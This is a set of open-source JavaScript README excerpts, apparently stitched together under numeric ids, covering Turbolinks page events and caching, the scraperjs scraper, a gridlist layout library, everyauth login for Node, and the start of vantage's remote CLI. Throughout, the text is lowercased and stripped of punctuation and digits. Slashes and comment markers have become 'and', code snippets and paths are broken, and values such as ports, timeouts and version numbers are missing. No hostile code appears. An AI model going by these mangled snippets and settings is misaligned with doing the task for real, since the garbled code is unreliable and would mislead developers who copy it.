modification yep it s unclear when it will be launched it won t be free in either meaning of the word likely  and the jury is still out on how good of a product it ll be i prefer free lightweight

5969840, turbolinks classic is now deprecated  turbolinks  turbolinks makes following links in your web application faster instead of letting the browser recompile the javascript and css between each page change it keeps the current page instance alive and replaces only the body or parts of and the title in the head think cgi vs persistent process do note that this of course means that you ll have a long running persistent session with maintained state that s what s making it so fast but it also means that you may have to pay additional care not to leak memory or otherwise bloat that long running state that should rarely be a problem unless you re doing something really funky but you do have to be aware of it your memory leaking sins will not be swept away automatically by the cleansing page change any more no jquery or any other library  turbolinks is designed to be as light weight as possible so you won t think twice about using it even for mobile stuff it does not require jquery or any other library to work but it works great with the jquery framework or whatever else you have with turbolinks pages will change without a full reload so you can t rely on domcontentloaded or jquery ready to trigger your code instead turbolinks fires events on document to provide hooks into the lifecycle of the page event and argument originalevent data and notes and and page before change and url and the page is about to change cancellable with event preventdefault does not fire on history back and forward page fetch and url and a new page is about to be fetched from the server page receive and url and a page has been fetched from the server but not yet parsed page before unload and affectednodes and nodes are about to be changed page change and affectednodes and nodes have changed also fires on domcontentloaded page update and and fired alongside both page change and jquery s ajaxsuccess if available page load and newbody and a new body element has been loaded into the dom does not fire on partial replacement or when a page is restored from cache so as not to fire twice on the same body page partial load and affectednodes and new elements have been loaded into the dom via partial replacement page restore and and a cached body element has been loaded into the dom page after remove and affectednode and an element has been removed from the dom or body evicted from the cache and must be cleaned up jquery event listeners are cleaned up automatically example load a fresh version of a page from the server page before change link clicked or turbolinks visit called cancellable page fetch about to send xhr page receive received response from server page before unload currentbody page has been parsed and is about to be changed page change newbody new body is in place page update page load newbody page has been loaded progress bar hidden scroll position updated page after remove oldbody an old body has been evicted from the cache example partial replacement with turbolinks replace page before unload currentnodes nodes are about to be changed page after remove currentnode a node has been removed from the dom and must be cleaned up fires once per node page change newnodes new nodes are in place page update page partial load newnodes example lifecycle setup javascript and and using jquery for simplicity document on ready  function event and and initialize persistent state document on ready page load  function event and and apply non idempotent transformations to the body document on page partial load  function event and and apply non idempotent transformations to the nodes in event originalevent data document on page change  function event and and idempotent function document on page after remove  function event and and delete references to the nodes in event originalevent data to prevent memory leaks page cache  page before unload currentbody page is about to be changed page change cachedbody body from cached page is in place page restore the number of pages turbolinks caches can be configured to suit your application s needs javascript turbolinks pagescached and and view the current cache size turbolinks pagescached  and and set the cache size if you need to make dynamic html updates in the current page and want it to be cached properly you can call javascript turbolinks cachecurrentpage note performing a partial replacement with url change will remove the current page from the cache this is because the replaced nodes cannot be brought back if the user clicks the back button following a visit with partial replacement the previous page will be fetched from the server transition cache a speed boost  transition cache makes loading cached pages instantaneous once a user has visited a page returning later to the page results in an instant load for example if page a is already cached by turbolinks and you are on page b clicking a link to page a will immediately display the cached copy of page a turbolinks will then fetch page a from the server and replace the cached page once the new copy is returned to enable transition cache include the following in your javascript javascript turbolinks enabletransitioncache the one drawback is that dramatic differences in appearance between a cached copy and new copy may lead to a jarring affect for the end user this will be especially true for pages that have many moving parts expandable sections sortable tables infinite scrolling etc if you find that a page is causing problems you can have turbolinks skip displaying the cached copy by adding data no transition cache to any dom element on the offending page progress bar  because turbolinks skips the traditional full page reload browsers won t display their native progress bar when changing pages to fill this void turbolinks offers a javascript and css based progress bar to display page loading progress as of v  the progress bar is turned on by default to disable or re enable the progress bar include one of the following in your javascript javascript turbolinks progressbar disable turbolinks progressbar enable the progress bar is implemented on the html element s pseudo before element and can be customized by including css with higher specificity than the included styles for example html turbolinks progress bar before background color red important height px important control the progress bar manually using these methods javascript turbolinks progressbar start turbolinks progressbar advanceto value and and where value is between   turbolinks progressbar done initialization  turbolinks will be enabled only if the server has rendered a get request why not all request types some browsers track the request method of each page load but triggering pushstate methods doesn t change this value this could lead to the situation where pressing the browser s reload button on a page that was fetched with turbolinks would attempt a post or something other than get because the last full page load used that method opting out of turbolinks  by default all internal html links will be funneled through turbolinks but you can opt out by marking links or their parent container with data no turbolink for example if you mark a div with data no turbolink  then all links inside of that div will be treated as regular links if you mark the body every link on that entire page will be treated as regular links note that internal links to files containing a file extension other than html will automatically be opted out of turbolinks to whitelist additional file extensions to be processed by turbolinks use turbolinks allowlinkextensions javascript turbolinks allowlinkextensions and and html turbolinks allowlinkextensions md and and html  md turbolinks allowlinkextensions coffee  scss and and html  md  coffee  scss also turbolinks is installed as the last click handler for links so if you install another handler that calls event preventdefault  turbolinks will not run this ensures that you can safely use turbolinks with things like data method  data remote  or data confirm from rails note in v  the default behavior of redirectto is to redirect via turbolinks on xhr and non get requests you can opt out of this behavior by passing turbolinks false to redirectto by default turbolinks includes itself in actioncontroller base to opt out of the turbolinks features in certain controllers redirectto behavior requestmethod cookie x xhr referer referrer check etc  set config turbolinks autoinclude to false in application rb and include turbolinks controller in the controllers where you use turbolinks jquery turbolinks  add the gem to your project then add the following line to your javascript manifest file after jquery js but before turbolinks js and and require jquery turbolinks asset change detection  you can track certain assets like application js and application css  that you want to ensure are always of the latest version inside a turbolinks session this is done by marking those asset links with data turbolinks track  like so link href and assets and application bdaadbcdabbedcaaa css rel stylesheet type text and css data turbolinks track if those assets change urls embed an md stamp to ensure this  the page will do a full reload instead of going through turbolinks this ensures that all turbolinks sessions will always be running off your latest javascript and css when this happens you ll technically be requesting the same page twice once through turbolinks to detect that the assets changed and then again when we do a full redirect to that page evaluating script tags  turbolinks will evaluate any script tags in pages it visits if those tags do not have a type or if the type is text and javascript all other script tags will be ignored as a rule of thumb when switching to turbolinks move all of your javascript tags inside the head and then work backwards only moving javascript code back to the body if absolutely necessary if you have any script tags in the body you do not want to be re evaluated then you can set the data turbolinks eval attribute to false script type text and javascript data turbolinks eval false console log i m only run once on the initial page load and script turbolinks will not re evaluate script tags on back and forward navigation unless their data turbolinks eval attribute is set to always script type text and javascript data turbolinks eval always console log i m run on every page load including history back and forward and script triggering a turbolinks visit manually  you can use turbolinks visit path to go to a url through turbolinks you can also use redirectto path turbolinks true in rails to perform a redirect via

22652910, scraperjs is a web scraper module that make scraping the web an easy job npm install scraperjs if you would like to test this is optional and requires the installation with the save dev tag  grunt test scraperjs exposes two different scrapers and a staticscraper  that is light fast and with a low footprint however it doesn t allow for more complex situations like scraping dynamic content and a dynamicscraper  that is a bit more heavy but allows you to scrape dynamic content like in the browser console both scrapers expose a very similar api with some minor differences when it comes to scraping try to spot the differences javascript var scraperjs require scraperjs scrape function return title a map function return this text get then function news console log news javascript var scraperjs require scraperjs scrape function return title a map function return this text get then function news console log news however it s possible to pass json serializable data example to any scraper the varible received by the scraping function is only for the dynamic scraper hardcoded for a more flexible scraping and crawling of the web sometimes we need to go through multiple web sites and we don t want map every possible url format for that scraperjs provides the router class javascript var scraperjs require scraperjs  router new scraperjs router otherwise function url console log url and url and couldn t be routed var path router on https and and www youtube com and watch and id createstatic scrape function return a map function return this attr href get then function links utils path utils params id links console log i m done scraperjs uses promises whenever possible so the scrapers should be used with the scraperpromise by creating a scraper javascript var scraperpromise scraperjs staticscraper create and and or dynamicscraper the following promises can be made over it they all return a scraper promise and onstatuscode code number callback function utils object  executes the callback when the status code is equal to the code and onstatuscode callback function code number utils object  executes the callback when receives the status code the callback receives the current status code and delay time number callback function last  utils object  delays the execution of the chain by time in milliseconds  and timeout time number callback function last  utils object  executes the callback function after time in milliseconds  and then lastresult  callback function last  utils object  executes the callback after the last promise and async callback function last  done function result  err  utils  executes the callback stopping the promise chain resuming it when the done function is called you can provide a result to be passed down the promise chain or an error to trigger the catch promise and catch callback function error error utils object  executes the callback when there was an error errors block the execution of the chain even if the promise was not defined and done callback function last  utils object  executes the callback at the end of the promise chain this is always executed even if there was an error and get url string  makes a simple http get request to the url this promise should be used only once per scraper all callback functions receive as their last parameter a utils object with it the parameters of an url from a router can be accessed also the chain can be stopped javascript dynamicscraper create then function  utils utils stop and and utils params paramname the promise chain is fired with the same sequence it was declared with the exception of the promises get and request that fire the chain when they ve received a valid response and the promises done and catch  which were explained above you can also waterfall values between promises by returning them with the exception of the promise timeout  that will always return undefined and it can be access through utils lastreturn you ve seen the utils object that is passed to promises it provides useful information and methods to your promises here s what you can do with it and lastresult  value returned in the last promise and stop  function to stop the promise chain and url  url provided to do the scraper and params  object with the parameters defined in the router matching pattern when lots of instances of dynamicscraper are needed it s creation gets really heavy on resources and takes a lot of time to make this more lighter you can use a factory  that will create only one phantomjs instance and every dynamicscraper will request a page to work with to use it you must start the factory before any dynamicsrcaper is created scraperjs dynamicscraper startfactory and then close the factory after the execution of your program scraperjs dynamicscraper closefactory to make the scraping function more robust you can inject code into the page var ds scraperjs dynamicscraper async function  done utils utils scraper inject dirname and and path and to and code js  function err and and in this case if there was an error won t fire catch promise if err done err else done scrape function return functioninthecodeinjected then function result console log result the router should be initialized like a class javascript var router new scraperjs router options the options object is optional and these are the options and firstmatch  a boolean if true the routing will stop once the first path is matched the default is false the following promises can be made over it and on path string and regexp and function url string  makes the promise for the match url or regular expression alternatively you can use a function to accept or not a passed url the promises get or request and createstatic or createdynamic are expected after the on promise and get  makes so that the page matched will be requested with a simple http request and createstatic  associates a static scraper to use to scrape the matched page this returns scraperpromise so any promise made from now on will be made over a scraperpromise of a staticscraper also the done promise of the scraper will not be available and createdynamic  associates a dynamic scraper to use to scrape the matched page this returns scraperpromise so any promise made from now on will be made over a scraperpromise of a dynamicscraper also the done promise of the scraper will not be available and route url string callback function boolean  routes an url through all matched paths calls the callback when it s executed true is passed if the route was successful false otherwise and use scraperinstance scraperpromise  uses a scraperpromise already instantiated and otherwise callback function url string  executes the callback function if the routing url didn t match any path and catch callback function url string error error  executes the callback when an error occurred on the routing scope not on any scraper for that situations you should use the catch promise of the scraper scraperjs always fetches the document with request  and then when using a dynamicscraper leverages phantom s setcontent to set the body of the page object this will result in subtly different processing of web pages compared to directly loading a url in phantomjs check the examples and doc and examples  the tests and test or just dig into the code it s well documented and it s

14335772, drag and drop library for a two dimensional resizable and responsive list of the gridlist library is split into two roles  an agnostic gridlist class gridlist class that manages the two dimensional positions from a list of items within a virtual matrix  a jquery plugin fngridlist built on top of the gridlist class that translates the generic items positions into responsive dom elements with drag and drop capabilities var mygrid new gridlist items direction horizontal  lanes  the first constructor parameter is an array of items primitives to populate the grid with supported options direction can be horizontal or vertical defaults to horizontal this sets how the grid can expand e g for horizontal the grid will stretch towards the right to accommodate all the items for vertical  it will stretch towards the bottom lanes number of fixed rows or columns depending on the direction mygrid generategrid build the grid structure from scratch using the positions of the given items if items lack positional attributes x and y  they will be misplaced possibly overlapping if you want to build a grid around a list of items that only have their size attributes defined w and h  and rely on the library to position them two dimensionally use resizegrid  resizegridrows mygrid resizegrid  re generate positions for the items inside a grid instance for a given number of rows and columns this method has two major use cases  items are being represented two dimensionally for the first time  items already have d positions but need to be represented on a different grid size maintaining as much as possible of their previous order positions inside the grid are generated left to right top to bottom so when looking for a new position inside the grid the topmost row from the leftmost column is chosen and and move item from   to   var carefreeitem mygrid grid   mygrid moveitemtoposition carefreeitem   here are things that happen when moving an item inside the grid  the item s previous position is cleared inside the d grid gridlistgrid   the position inside the item object item is updated  the item s new position is marked inside the d grid and  collisions are handled if the moved item overlaps with other item s from the grid collisions can be solved in two ways first an attempt to resolve them locally is made meaning that the moved item tries to swap position with the overlapped item s this is the preferred fair trade  if this doesn t work out and after swapping we still have collisions inside the grid the entire grid will be regenerated resizegridrows  starting with the moved item fixed in its new position in the latter case all the items around and to the right of the moved item might have their position slightly altered and and resize item from position   to span over  columns var growthitem mygrid grid   mygrid resizeitem growthitem w  console log growthitem w and and will output  mygrid resizing growthitem h  console log growthitem h and and will output  resizing an item is very similar to moving its position in the sense that grid gridlistgrid cells will be repopulated and collisions will be handled afterwards see moveitemtoposition moveitemtopositionitem position the item is the building block of gridlist and is a plain javascript object the primary function of the gridlist is to position such items two dimentionally which brings us to the composition of an item w and h for size x and y for position e g w  h  x  y  note that x and y column and row are abstract coords inside the grid they are integer values starting from  naturally w and h width and height also take up space in the same coordinate system which reveals the smallest unit of a grid the cell you could say for example that the featured item above takes up three grid cells a gridlist instance works around an array of items the items array is the first parameter of the class constructor and is always visible under the items property here s a list of items for a grid with three x items on a column with three rows w  h  x  y   w  h  x  y   w  h  x  y  seeing how javascript doesn t support multidimensional arrays the d grid inside gridlist is represented by an array for columns with each array entry containing another array with cells for each row the cell is simply a pointer to an item that occupies it or a null reference if no item is sitting on that cell s position  note that more cells can point to the same item reference because items occupy w h cells here s a grid pseudo representation and col and col and col and col and and and and and and and  and  and and and and  and  and  and  and and  and and  and  and having the grid in a two dimensional data structure we can fetch item references directly by targeting any of the cells they cover inside the grid mygrid grid   and and reference to item  mygrid grid   and and reference to item  mygrid grid   and and reference to item  mygrid grid   and and still reference to item  ps this grid would be generated by these items w  h  x  y   w  h  x  y   w  h  x  y   w  h  x  y  my list gridlist direction horizontal  lanes  the jquery plugin has two main functions render the gridlist on top of a list of dom elements the list items are expected to have data w and data h attributes and optionally data x and data y if their positions have been previously generated and persisted drag and drop capabilities the function takes an optional argument with options that will be passed to the draggables when constructing them my list gridlist lanes   handle title the available options the rendered list is responsive to its parent container meaning that the width and height of the items are calculated based on the container height divided by the number of grid rows their readme reads ducksboard is no longer active in their development there are a few notable forks but it s hard to assert their gridster works vertically while our solution works both vertically and horizontally our lib contains over  times fewer code gridster collisions are very better ux and found alternative ways for dealing with collisions we wanted out of the box responsiveness and the entire grid system was build fluid relative to any parent container we needed the grid logic to be a dom less lib outside the jquery plugin this allows us to compute grid positions on the server side and run kick ass fast tests with node another more particular thing we needed was widgets that had height  which means they stretch on however many rows a grid has we show timelines like this it also works for width  investigating these assumptions

1574656, everyauth  authentication and authorization password facebook more for your node js connect and express apps there is also a google groups recently created potential ideas and extensions to the library so far everyauth enables you to login via table style text align left thead th authenticate via th credits and thead tbody and tbody tbody id misc and tbody everyauth is modular we have you covered with facebook and twitter oauth logins basic login and password support and modules coming soon for beta invitation support and more easily configurable everyauth was built with powerful configuration needs in mind configure an authorization strategy in a straightforward easy to read easy to write approach with as much granularity as you want over the steps and logic of your authorization strategy idiomatic the syntax for configuring and extending your authorization strategies are idiomatic and chainable npm install everyauth incorporate everyauth into your express app in just  easy steps  choose and configure auth strategies find the authentication strategy you desire in one of the sections below follow the configuration instructions  add the middleware to express javascript var everyauth require everyauth and and step  code goes here and and step  code var express require express var app express use express bodyparser use express cookieparser mr ripley use express session use everyauth middleware app to run it cd example node server js important some oauth providers do not allow callbacks to localhost so you will need to create a localhost alias called local host make sure you set up your and etc and hosts so that     is also associated with local host so inside your and etc and hosts file one of the lines will look like     localhost local host npm install everyauth dev then update test and creds js with credentials that the integration tests use to login to each rd party service make test if you are using express or connect  then everyauth provides an easy way to access the user as req user from your app server everyauth user via the everyauth helper accessible from your express views user as a helper accessible from your express views to access the user configure everyauth everymodule finduserbyid and optionally everyauth everymodule userpkey javascript everyauth everymodule finduserbyid function userid callback user findbyid userid callback and and callback has the signature function err user if you need access to the request object the function can have three arguments javascript everyauth everymodule finduserbyid function req userid callback and and use the request in some way and and callback has the signature function err user once you have configured this method you now have access to the user object that was fetched anywhere in your server app code as req user for instance javascript var app require express createserver and and configure your app app get and  function req res console log req user and and ftw res render home moreover you can access the user in your views as everyauth user or as user and and inside and views and home jade span user id everyauth user name user id user id everyauth assumes that you store your users with an id property if not e g if you adopt the convention user uid over user id then just make sure to configure the everyauth everymodule userpkey parameter javascript everyauth everymodule userpkey uid if you are using express everyauth comes with some useful dynamic helpers to enable them javascript var express require express  everyauth require everyauth  app express createserver everyauth helpexpress app then from within your views you will have access to the following helpers methods attached to the helper everyauth everyauth loggedin everyauth user the user document associated with the session everyauth facebook the is equivalent to what is stored at req session auth facebook  so you can do things like everyauth facebook user returns the user json provided from the oauth provider everyauth facebook accesstoken returns the accesstoken provided from the oauth provider for authorized api calls on behalf of the user and you also get this pattern for other modules e g  everyauth twitter user  everyauth github user  etc you also get access to the view helper user the same as everyauth user above as an example of how you would use these consider the following and views and user jade jade template user id label user id value user id facebook id label user facebook id value everyauth facebook user id if you already have an express helper named user  then you can configure everyauth to use a different helper name to access the user object that everyauth manages to do so leverage the useralias option for everyauth helpexpress javascript everyauth helpexpress app useralias user then you could access the user object in your view with the helper user instead of the default helper user so you can compare with the default use of helpers given previously the alternative leveraging useralias would look like user id label user id value user id facebook id label user facebook id value everyauth facebook user id everyauth also provides convenience methods on the serverrequest instance req from any scope that has access to req  you get the following convenience getters and methods req loggedin a boolean getter that tells you if the request is by a logged in user req user the user document associated with the session req logout clears the session of your auth data if you integrate everyauth with connect  then everyauth automatically sets up a logoutpath at get and logout for your app it also sets a default handler for your logout route that clears your session of auth information and redirects them to and to over write the logout path javascript everyauth everymodule logoutpath and bye to over write the logout redirect path javascript everyauth everymodule logoutredirectpath and navigate and to and after and logout to over write the logout handler javascript everyauth everymodule handlelogout function req res and and put you extra logic here req logout and and the logout method is added for you by everyauth too and and and and or put your extra logic here this redirect res this logoutredirectpath you may want your own callback that decides where to send a user after login or registration one way of doing this is with the respondtologinsucceed and respondtoregistrationsucceed methods this assumes that you have set a redirectto property on your req session object javascript everyauth password respondtologinsucceed function res user data if user this redirect res data session redirectto respondtoregistrationsucceed function res user data this redirect res data session redirectto if you are using express and want your redirects to be subject to express overwrite redirect method employed by everyauth javascript everyauth everymodule performredirect function res location res redirect location  a newly defined method will be used by everyauth to perform all redirects javascript var everyauth require everyauth  connect require connect everyauth facebook appid your app id

userdenied error accessdenied errordescription the and user and denied and your and request and and this configurable route handler defines how you want to respond to and and that and and if you do not configure this everyauth renders a default fallback and and view notifying the user that their authentication failed and why findorcreateuser function session accesstoken accesstokextra fbusermetadata and and find or create user logic goes here redirectpath and var routes function app and and define your routes here connect bodyparser  connect cookieparser  connect session secret whodunnit  everyauth middleware  connect router routes listen  you can also configure more parameters most are set to defaults via the same chainable api javascript everyauth facebook entrypath and auth and facebook callbackpath and auth and facebook and callback scope email and and defaults to undefined fields idnameemailpicture and and controls the returned fields defaults to undefined if you want to see what the current value of a configured parameter is you can do so via javascript everyauth facebook scope and and undefined everyauth facebook fields and and undefined everyauth facebook entrypath and and and auth and facebook to see all parameters that are configurable the following will return an object whose parameter name keys map to description values javascript everyauth facebook configurable facebook provides many different for which your app can ask your user this is bundled up in the scope query paremter sent with the oauth request to facebook while your app may require several different permissions from facebook facebook recommends that you only ask for these permissions incrementally as you need them for example you might want to only ask for the email scope upon registration at the same time for another user you may want to ask for userstatus permissions because they have progressed further along in your application everyauth enables you to specify the scope dynamically with a second variation of the configurable scope in addition to the first variation that looks like javascript everyauth facebook scope emailuserstatus you can have greater dynamic control over scope via the second variation of scope javascript everyauth facebook scope function req res var session req session switch session userphase case registration return email case share media return emailuserstatus if you are programming for mobile you can bring up the facebook mobile oauth dialog instead of the traditional desktop browser based one by just adding mobile true to your configuration as seen here javascript everyauth facebook mobile true appid your app id here appsecret your app secret here and and rest of configuration javascript var everyauth require everyauth  connect require connect everyauth twitter consumerkey your consumer id here consumersecret your consumer secret here findorcreateuser function session accesstoken accesstokensecret twitterusermetadata and and find or create user logic goes here redirectpath and var routes function app and and define your routes here connect bodyparser  connect cookieparser  connect session secret whodunnit  everyauth middleware  connect router routes listen  important some developers forget to do the following and it causes them to have issues with everyauth include that path and auth and twitter and callback and in general when dealing with oauth or oauth modules provided by everyauth  the default callback path is always set up to follow the pattern and auth and modulename and callback  so just ensure that you configure your oauth settings accordingly with alternatively you can specify the callback url at the application level by configuring callbackpath which has a default configuration of and auth and twitter and callback javascript everyauth twitter consumerkey your consumer id here consumersecret your consumer secret here callbackpath and custom and twitter and callback and path findorcreateuser function session accesstoken accesstokensecret twitterusermetadata and and find or create user logic goes here redirectpath and so if your hostname is example com  then this configuration will over ride the dev twitter com callback url configuration instead twitter will redirect back to example com and custom and twitter and callback and path in the example just given above you can also configure more parameters most are set to defaults via the same chainable api javascript everyauth twitter entrypath and auth and twitter callbackpath and auth and twitter and callback if you want to see what the current value of a configured parameter is you can do so via javascript everyauth twitter callbackpath and and and auth and twitter and callback everyauth twitter entrypath and and and auth and twitter to see all parameters that are configurable the following will return an object whose parameter name keys map to description values javascript everyauth twitter configurable javascript var everyauth require everyauth  connect require connect everyauth password getloginpath and login and and uri path to the login page postloginpath and login and and uri path that your login form posts to loginview a string of html or the name of the jade and etc view engine view authenticate function login password and and either we return a user or an array of errors if doing sync auth and and or we return a promise that can fulfill to promise fulfill user or promise fulfill errors and and errors is an array of error message strings and and e g  and and example  sync

this promise and and yourusermodel find login login  function err user and and if err return promise fulfill err and and promise fulfill user and and return promise loginsuccessredirect and and and where to redirect to after a login and and if login fails we render the errors via the login view template and and so just make sure your loginview template incorporates an errors local and and see and example and views and login jade getregisterpath and register and and uri path to the registration page postregisterpath and register and and the uri path that your registration form posts to registerview a string of html or the name of the jade and etc view engine view validateregistration function newuserattributes and and validate the registration input and and return undefined null or if validation succeeds and and return an array of error messages or promise promising this array and and if validation fails and and e g  assuming you define validate with the following signature and and var errors validate login password extraparams and and return errors and and the errors you return show up as an errors local in your jade template registeruser function newuserattributes and and this step is only executed if we pass the validateregistration step without and and any errors and and returns a user or a promise that promises a user after adding it to and and some user store and and as an edge case sometimes your database may make you aware of violation and and of the unique login index so if this error is sent back in an async and and callback then you can just return that error as a single element array and and containing just that error message and everyauth will automatically handle and and that as a failed registration again you will have access to this error via and and the errors local in your register view jade template and and e g  and and var promise this promise and and user create newuserattributes function err user and and if err return promise fulfill err and and promise fulfill user and and and and return promise and and note index and db driven validations are the only validations that occur and and here all other validations occur in the validateregistration step documented above registersuccessredirect and and and where to redirect to after a successful registration var routes function app and and define your routes here connect bodyparser  connect cookieparser  connect session secret whodunnit  everyauth middleware  connect router routes listen  you can also configure more parameters most are set to defaults via the same chainable api javascript everyauth password loginformfieldname login and and defaults to login passwordformfieldname password and and defaults to password loginlayout customloginlayout and and only with express registerlayout custom reglayout and and only with express loginlocals fn and and see recipe  below if you want to see what the current value of a configured parameter is you can do so via javascript everyauth password loginformfieldname and and login everyauth password passwordformfieldname and and password to see all parameters that are configurable the following will return an object whose parameter name keys map to description values javascript everyauth password configurable sometimes your registration will ask for more information from the user besides the login and password for this particular scenario you can configure the optional step extractextraregistrationparams javascript everyauth password extractextraregistrationparams function req return phone req body phone  name first req body firstname  last req body lastname then you will have access to this data from within your configured validateregistration and registeruser javascript everyauth password validateregistration function newuserattributes var phone newuserattributes phone  firstname newuserattributes name first  lastname newuserattributes name last registeruser function newuserattributes var phone newuserattributes phone  firstname newuserattributes name first  lastname newuserattributes name last by default everyauth uses the field and user key name login during the registration and login process sometimes you want to use email or phone instead of login moreover you also want to validate email and phone fields upon registration everyauth provides an easy way to do this javascript everyauth password loginwith email everyauth password loginwith phone with simple login configuration like this you get email or phone validation in addition to renaming of the form field and user key corresponding to what otherwise would typically be referred to as login if you are using express  you are able to pass variables from your app context to your view context via local variables everyauth provides several convenience local vars for your views but sometimes you will want to augment this set of local vars with additional locals so everyauth also provides a mechanism for you to do so via the following configurables javascript everyauth password loginlocals everyauth password registerlocals loginlocals and registerlocals configuration have symmetrical apis so i will only cover loginlocals here to illustrate how to use both you can configure this parameter in one of  ways why  because there are  types of ways that you can retrieve your locals  static local vars that never change values javascript everyauth password loginlocals title login    dynamic synchronous local vars that depend on the incoming request but whose values are retrieved synchronously javascript everyauth password loginlocals function req res var sess req session return isreturning sess isreturning     dynamic asynchronous local vars javascript everyauth password loginlocals function req res done asynccall function err data if err return done err done null title iln titleinlanguage login page  iln language data geo     by default everyauth password automatically validates that the login or email or phone depending on what you authenticate with see password recipe  is present in the login http request validates that the password is present validates that an email login is a correctly formatted email validates that a phone login is a valid phone number if any of these validations fail then the appropriate errors are generated and accessible to you in your view via the errors view local variable if you want to add additional validations beyond this you can do so by configuring the step validateregistration javascript everyauth password validateregistration function newuserattributes baseerrors and and here newuserattributes is the hash of parameters extracted from the incoming request and and baseerrors is the array of errors generated by the default automatic validation outlined above and and in this same recipe and and first validate your errors here validateuser is a made up function var moreerrors validateuser newuserattributes if moreerrors length baseerrors push apply baseerrors moreerrors and and return the array of errors so your view has access to them return baseerrors by default everyauth is agnostic about how you decide to store your users and therefore passwords however one should always use password hashing and salting for security here s an example of how to incorporate password hashing into everyauth using bcrypt hashing the idea is to store a salt and hash value inside your user object instead of the password the hash value is generated from the password sent with a registration or login request and unique salt per user using the bcrypt algorithm javascript and and make sure to npm install bcrypt var bcrypt require bcrypt everyauth password registeruser function newuserattrs var promise this promise  password newuserattrs password delete newuserattrs password and and don t store password newuserattrs salt bcrypt gensaltsync  newuserattrs hash bcrypt hashsync password salt and and create a new user in your data store createuser newuserattrs function err createduser if err return promise fail err return promise fulfill createduser return promise authenticate function login password var promise  errors if

everyauth was built with powerful configuration needs in mind every module comes with a set of parameters that you can configure directly to see a list of those parameters on a per module basis with descriptions about what they do enter the following into the node repl to access the repl just type node at the command line var ea require everyauth ea facebook configurable for example you will see that one of the configuration parameters is moduletimeout  which is described to be how long to wait per step before timing out and invoking any timeout callbacks every configuration parameter corresponds to a method of the same name on the auth module under consideration i e  in this case ea facebook to create or over write that parameter just call that method with the new value as the argument javascript ea facebook moduletimeout  and and wait  seconds before timing out any step and and involved in the facebook auth process configuration parameters can be scalars but they can be anything for example they can also be functions too the facebook module has a configurable step named findorcreateuser that is described as step fn findorcreateuser function encapsulating the logic for the step fetchoauthuser what this means is that this configures the function i e  fn that encapsulates the logic of this step javascript ea facebook findorcreateuser function session accesstoken extra oauthuser and and find or create user logic goes here how do we know what arguments the function takes we elaborate more about step function configuration in our introspection section below everyauth also supports a special method configure for coffee script aficionados coffee and chainable apis often don t mix well as an alternative you can configure an everyauth module using an object passed to configure coffee everyauth dropbox configure consumerkey conf dropbox consumerkey consumersecret conf dropbox consumersecret findorcreateuser sess accesstoken accesssecret dbmeta users dbmeta uid or adduser dropbox  dbmeta redirectpath and everyauth provides convenient methods and getters for finding out about any module show all configurable parameters with their descriptions javascript everyauth facebook configurable show the value of a single configurable parameter javascript and and get the value of the configurable callbackpath parameter everyauth facebook callbackpath and and and auth and facebook and callback show the declared routes pretty printed javascript everyauth facebook routes show the steps initiated by a given route javascript everyauth facebook route get entrypath steps everyauth facebook route get callbackpath steps sometimes you need to set up additional steps for a given auth module by defining that step in your app for example the set of steps triggered when someone requests the facebook module s callbackpath contains a step that you must define in your app to see what that step is you can introspect the callbackpath route with the facebook module javascript everyauth facebook route get callbackpath steps incomplete and and name findorcreateuser  and and error is missing its function this tells you that you must define the function that defines the logic for the findorcreateuser step to see what the function signature looks like for this step javascript var matchingstep everyauth facebook route get callbackpath steps filter function step return step name findorcreateuser and and name findorcreateuser  and and accepts session  accesstoken  extra  oauthuser  and and promises user this tells you that the function should take the following  arguments javascript function session accesstoken extra oauthuser and that the function should return a user that is a user object or a promise that promises a user object javascript and and for synchronous lookup situations you can return a user function session accesstoken extra oauthuser return id some user id  username some user name and and for asynchronous lookup situations you must return a promise that and and will be fulfilled with a user later on function session accesstoken extra oauthuser var promise this promise asyncfinduser function err user if err return promise fail err promise fulfill user return promise you add this function as the block for the step findorcreateuser just like you configure any other configurable parameter in your auth module javascript everyauth facebook findorcreateuser function session accesstoken extra oauthuser and and logic goes here there are also several other introspection tools at your disposal for example to show the submodules of an auth module by name javascript everyauth oauth submodules other introspection tools to describe explanations coming soon invalid steps javascript everyauth facebook routes get callbackpath steps invalid to turn on debugging javascript everyauth debug true each everyauth auth strategy module is composed of steps as each step begins and ends everyauth will print out to the console the beginning and end of each step so by turning on the debug flag you get insight into what step everyauth is executing at any time for example here is some example debugging information output to the console during a facebook connect authorization starting step getauthuri finished step starting step requestauthuri finished step starting step getcode finished step starting step getaccesstoken finished step starting step fetchoauthuser finished step starting step getsession finished step starting step findorcreateuser finished step starting step compile finished step starting step addtosession finished step starting step sendresponse finished step by default all modules handle errors by throwing them that said everyauth allows you to over ride this behavior you can configure error handling at the module and step level to handle all errors in the same manner across all auth modules that you use do the following javascript everyauth everymodule moduleerrback function err and and do something with the err e g  log it throw it you can also configure your error handling on a per module basis so for example if you want to handle errors during the facebook module differently than in other modules javascript everyauth facebook moduleerrback function err and and do something with the err e g  log it throw it by default every module has  seconds to complete each step if a step takes longer than  seconds to complete then everyauth will pass a timeout error to your configured error handler see section configure error handling above if you would like to increase or decrease the timeout period across all modules you can do so via javascript everyauth everymodule moduletimeout  and and wait  seconds per step instead before timing out you can eliminate the timeout altogether by configuring your timeouts to  javascript everyauth everymodule moduletimeout  you can also configure the timeout period on a per module basis for example the following will result in the facebook module having  seconds to complete each step before timing out all other modules will have the default  seconds per step before timing out javascript everyauth facebook moduletimeout  and and wait  seconds the following projects use everyauth if you are using everyauth in a project app or module get on the list below by getting in touch or submitting a pull request with changes to the readme for use with the node js mongodb orm the following are rd party screencasts and blog posts about either getting up and running with everyauth or writing your own

36537989, vantage cli and ssh and repl for your live node app in one line require vantage listen  what just happened er that gif im so confused tell me more contents introduction introduction getting started getting started api api events events automation automation extensions extensions license license footnotes footnotes vantage gives you a new perspective into your live node application not previously available first class cli tab completion history you name it build your own api with the familiar syntax of commander js ssh like client and server setup for remote access to your live node app production ready with authentication middleware and a basic firewall built in repl unlike any other repl or cli module vantage allows you to remotely connect to your live app and access the cli transparently exactly as you would in an ssh session vantage can connect through an unlimited number of live node instances across multiple machines piping commands and information to and from your local terminal npm install g vantage vantage tour first install vantage globally npm install g vantage now add the following to a file named server js and and create a new instance of vantage var vantage require vantage and and add the command foo  which logs bar command foo description outputs bar action function args callback this log bar callback and and name your prompt delimiter and and websvr  listen on port  and and and show the vantage prompt delimiter websvr listen  show run server js you node app has become a cli node server js websvr open another terminal because vantage is listening on port  you can remotely connect to it vantage  connecting to      using http websvr try out your foo command websvr foo now type help to see vantage s built in commands in addition to foo websvr help commands help command 